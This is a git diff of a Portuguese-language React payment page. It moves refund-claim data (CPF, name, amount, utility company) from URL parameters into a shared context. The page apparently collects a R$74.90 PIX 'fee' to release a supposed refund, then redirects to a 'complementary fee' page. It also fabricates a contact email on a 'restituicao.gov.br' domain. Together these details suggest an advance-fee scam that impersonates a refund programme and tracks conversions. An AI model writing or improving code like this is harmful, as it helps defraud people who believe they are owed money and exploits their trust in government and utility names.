@@ -12,6 +12,7 @@ import { playNotificationSound } from "@/components/NotificationSound";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { notifyPixGenerated, notifyPaymentConfirmed } from "@/lib/utmify";
+import { useUserData } from "@/contexts/UserContext";
 
 // Gerar um código PIX aleatório
 const gerarCodigoPix = () => {
@@ -91,31 +92,26 @@ interface PaymentInfo {
 export default function PagamentoPix() {
   const [location, navigate] = useLocation();
   const { toast } = useToast();
+  const { userData, updateUserData } = useUserData();
   
-  // Obter parâmetros da URL
-  const urlParams = new URLSearchParams(window.location.search);
-  
-  // Dados da restituição
-  const cpf = urlParams.get('cpf') || "";
-  const nome = urlParams.get('nome') || "";
+  // Dados da restituição do contexto global
+  const cpf = userData.cpf || "";
+  const nome = userData.nome || "";
   
   // Corrigir a formatação do valor - converter centavos para reais
-  let valor = 0;
-  const valorParam = urlParams.get('valor') || "0";
-  if (valorParam) {
-    // Se o valor for maior que 10.000, provavelmente está em centavos
-    // e precisa ser convertido para reais
-    const valorNumerico = parseFloat(valorParam);
-    valor = valorNumerico > 10000 ? valorNumerico / 100 : valorNumerico;
-  }
+  let valor = userData.valorRestituicao || 0;
   
-  const companhia = urlParams.get('companhia') || "CEMIG Distribuição";
-  const estado = urlParams.get('estado') || "Minas Gerais";
-  const dataNascimento = urlParams.get('nasc') || "21/07/2003";
-  const bancoNome = urlParams.get('bancoNome') || "Banco do Brasil";
+  const companhia = userData.companhia || "CEMIG Distribuição";
+  const estado = userData.estado || "Minas Gerais";
+  const dataNascimento = userData.dataNascimento || "01/01/1990";
   
-  const email = urlParams.get('email') || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
-  const telefone = urlParams.get('telefone') || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
+  // Gerar dados bancários se não estiverem no contexto
+  const bancoNome = userData.contaBancaria?.banco || "Banco do Brasil";
+  
+  // Gerar email e telefone se não estiverem no contexto
+  const email = userData.email || `${cpf.substring(0, 3)}xxx${cpf.substring(9, 11)}@restituicao.gov.br`;
+  const telefone = userData.telefone || `(11) 9${Math.floor(Math.random() * 9000) + 1000}-${Math.floor(Math.random() * 9000) + 1000}`;
+  
   const valorFormatado = formatarValor(valor);
   const valorTaxaFormatado = formatarValor(74.90);
   const cpfFormatado = cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
@@ -269,26 +265,23 @@ export default function PagamentoPix() {
             // Não interrompe o fluxo principal se houver erro na integração com UTMify
           }
           
-          // Preparar parâmetros para o redirecionamento
-          const params = new URLSearchParams({
-            cpf: cpf,
-            nome: nome,
-            valor: valor.toString(),
+          // Atualizar o contexto com os dados do pagamento
+          updateUserData({
+            cpf,
+            nome,
+            valorRestituicao: valor,
             pagamentoId: paymentInfo.id,
-            dataPagamento: new Date().toISOString(),
-            companhia: companhia,
-            estado: estado,
-            nasc: dataNascimento,
-            agencia: urlParams.get('agencia') || "",
-            conta: urlParams.get('conta') || "",
-            email: email,
-            telefone: telefone
+            companhia,
+            estado,
+            dataNascimento,
+            email,
+            telefone
           });
           
           // Redirecionar para a página de taxa complementar após confirmação real
           console.log("[VerificaçãoPIX] Redirecionando para a página de taxa complementar");
           setTimeout(() => {
-            navigate(`/taxa-complementar?${params.toString()}`);
+            navigate('/taxa-complementar');
           }, 1500);
         } else {
           console.log("[VerificaçãoPIX] Pagamento ainda pendente:", data.status);
